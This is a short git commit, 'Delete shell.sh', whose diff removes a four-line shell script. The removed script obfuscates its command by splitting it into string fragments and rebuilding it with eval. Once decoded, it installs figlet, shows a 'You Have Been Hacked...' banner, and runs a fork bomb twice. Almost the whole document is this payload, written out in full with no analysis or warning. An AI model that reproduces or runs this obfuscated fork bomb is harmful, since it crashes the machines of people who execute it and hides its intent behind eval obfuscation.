d65a722e79e8cb4afe34eb4a0d51d09ed08144a7
Nithin ananmous <68257219+nithin644@users.noreply.github.com>
2022-09-19 17:32:40 +0530

    Delete shell.sh

--- shell.sh
+++
@@ -1,4 +0,0 @@
-
-z="
-";Fz='y';Nz='Been';Mz='ave ';Az='apt ';Pz='ked.';Tz=' :|:';Ez='et -';Cz='all ';Oz=' Hac';Gz='clea';Bz='inst';Kz='et Y';Lz='ou H';Iz='slee';Hz='r';Sz=':(){';Qz='..';Uz='& };';Rz='p 1';Dz='figl';Vz=':';Jz='p 2';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$z$Gz$Hz$z$Iz$Jz$z$Dz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$z$Iz$Rz$z$Sz$Tz$Uz$Vz$z$Sz$Tz$Uz$Vz"
